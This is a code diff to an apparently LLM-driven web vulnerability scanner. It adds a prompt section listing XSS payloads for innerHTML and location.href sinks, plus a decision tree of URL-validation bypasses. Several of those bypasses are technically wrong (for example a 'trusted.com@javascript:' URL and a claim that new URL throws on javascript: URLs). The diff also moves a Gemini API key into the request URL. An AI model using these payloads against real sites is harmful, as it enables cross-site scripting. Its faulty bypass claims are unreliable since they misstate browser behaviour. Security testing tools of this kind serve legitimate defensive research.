@@ -278,6 +278,90 @@ Look for these prototype pollution indicators:
 - Use the detected data_type format (JSON objects vs strings)
 - If no vulnerabilities found: Return empty payload arrays
 
+**CRITICAL: URL Validation Bypass Techniques**
+
+When you detect URL validation in the handler code (e.g., location.href, window.open, iframe.src), generate payloads that bypass common validation patterns:
+
+**Common Validation Patterns & Bypasses:**
+
+1. **indexOf('http:') or indexOf('https:') checks:**
+   ✅ CORRECT: javascript:alert(1)//https:
+   ✅ CORRECT: javascript:alert(1)//http:
+   ✅ CORRECT: data:text/html,<script>alert(1)</script>//https:
+   ❌ WRONG: http://example.com/?q=javascript:alert(1)  (doesn't execute)
+   ❌ WRONG: https://example.com/#javascript:alert(1)  (doesn't execute)
+
+2. **startsWith('http') or startsWith('https') checks:**
+   ✅ CORRECT: https://trusted.com@javascript:alert(1)
+   ✅ CORRECT: http://trusted.com@javascript:alert(1)
+   ✅ CORRECT: https:javascript:alert(1)
+   ❌ WRONG: javascript:alert(1)  (blocked by startsWith check)
+
+3. **includes('http') checks:**
+   ✅ CORRECT: javascript:alert('http')
+   ✅ CORRECT: javascript:/*http*/alert(1)
+   ✅ CORRECT: data:text/html,<script>/*http*/alert(1)</script>
+
+4. **URL parsing with new URL():**
+   ✅ CORRECT: javascript:alert(1)  (throws error, not assigned)
+   ✅ CORRECT: Use prototype pollution to bypass validation
+   ❌ WRONG: http://evil.com  (passes validation)
+
+**OUTPUT FORMAT for XSS Payloads:**
+
+For innerHTML/outerHTML sinks:
+{
+  "xss_payloads": [
+    "<img src=x onerror=alert(document.domain)>",
+    "<svg/onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "<details open ontoggle=alert(1)>"
+  ]
+}
+
+For location.href/URL sinks (check validation pattern first):
+{
+  "xss_payloads": [
+    "javascript:alert(document.domain)",
+    "javascript:alert(1)//https:",
+    "data:text/html,<script>alert(document.domain)</script>"
+  ]
+}
+
+**FORBIDDEN Payloads (NEVER generate these):**
+❌ http://example.com/?q=javascript:alert(1)  - Query string XSS doesn't execute in location.href
+❌ https://example.com/#javascript:alert(1)  - Hash XSS doesn't execute in location.href
+❌ http://example.com/%0Ajavascript:alert(1) - Newline encoding doesn't bypass validation
+❌ Any payload that passes validation but doesn't execute
+
+**Decision Tree for URL Sink Payloads:**
+
+IF handler contains: url.indexOf('http') > -1 || url.indexOf('https') > -1
+  → Generate: javascript:alert(1)//https:
+  → Generate: data:text/html,<script>alert(1)</script>//http:
+
+IF handler contains: url.startsWith('http://') || url.startsWith('https://')
+  → Generate: https://trusted.com@javascript:alert(1)
+  → Generate: http://trusted.com@javascript:alert(1)
+
+IF handler contains: url.includes('http')
+  → Generate: javascript:alert('http')
+  → Generate: javascript:/*http*/alert(1)
+
+IF handler contains: new URL(url)
+  → Generate prototype pollution payloads to bypass validation
+  → Note: javascript: URLs throw error in URL constructor
+
+IF NO validation detected:
+  → Generate: javascript:alert(document.domain)
+  → Generate: data:text/html,<script>alert(1)</script>
+
+**Payload Validation Enforcement:**
+- Every payload MUST be executable (causes alert/script execution)
+- Every payload MUST bypass the specific validation pattern found
+- If unsure whether a payload will execute, DO NOT include it
+- Test your logic: Would this payload actually execute in the browser?
+
 **CRITICAL REQUIREMENTS:**
 1. You MUST provide handler_match score (0-100)
 2. You MUST provide all required fields - no omissions allowed
@@ -461,12 +545,6 @@ async function runLLM(provider, model, apiKey, prompt) {
         if (provider === 'openai') {
             result = await callOpenAICompatible('https://api.openai.com/v1/chat/completions', { 'authorization': `Bearer ${apiKey}`, 'content-type': 'application/json' });
             return result;
-        } else if (provider === 'groq') {
-            result = await callOpenAICompatible('https://api.groq.com/openai/v1/chat/completions', { 'authorization': `Bearer ${apiKey}`, 'content-type': 'application/json' });
-            return result;
-        } else if (provider === 'mistral') {
-            result = await callOpenAICompatible('https://api.mistral.ai/v1/chat/completions', { 'authorization': `Bearer ${apiKey}`, 'content-type': 'application/json' });
-            return result;
         } else if (provider === 'anthropic') {
             const body = {
                 model,
@@ -493,22 +571,25 @@ async function runLLM(provider, model, apiKey, prompt) {
                     total_tokens: (usage.input_tokens || 0) + (usage.output_tokens || 0)
                 }
             };
-        } else if (provider === 'google') {
+        } else if (provider === 'google' || provider === 'gemini') {
             const body = {
                 contents: [{
                     parts: [{ text: `${prompt.system}\n\n${prompt.user}` }]
                 }],
                 generationConfig: {
-                    temperature: 0.2,
-                    maxOutputTokens: 1500
+                    temperature: 0.3,
+                    maxOutputTokens: 2048
                 }
             };
-            const resp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent`, {
+            const resp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${apiKey}`, {
                 method: 'POST',
-                headers: { 'content-type': 'application/json', 'x-goog-api-key': apiKey },
+                headers: { 'content-type': 'application/json' },
                 body: JSON.stringify(body)
             });
-            if (!resp.ok) throw new Error(`LLM HTTP ${resp.status}`);
+            if (!resp.ok) {
+                const errorText = await resp.text();
+                throw new Error(`Gemini API error: ${resp.status} - ${errorText}`);
+            }
             const data = await resp.json();
             const content = data?.candidates?.[0]?.content?.parts?.[0]?.text || '';
             return { content, usage: { prompt_tokens: 0, completion_tokens: 0, total_tokens: 0 } };
